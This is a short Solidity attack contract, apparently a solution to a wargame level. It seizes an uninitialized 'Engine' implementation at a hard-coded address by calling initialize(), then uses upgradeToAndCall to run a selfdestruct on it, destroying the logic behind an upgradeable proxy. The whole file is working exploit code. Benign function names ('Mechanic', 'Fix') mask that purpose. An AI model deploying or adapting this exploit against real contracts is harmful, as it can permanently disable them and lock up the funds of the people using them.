//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;    
    
interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Mechanic {
    address private _ENGINE  = 0x1Ec276977d53b963B3ecA2aEAe11883Cd5680088;
    IEngine engineInstance = IEngine(_ENGINE);

    function Kill() public {
        selfdestruct(tx.origin);
    }

    function Fix() public{
        engineInstance.initialize();
        engineInstance.upgradeToAndCall(address(this),abi.encodeWithSignature("Kill()"));
    }

}
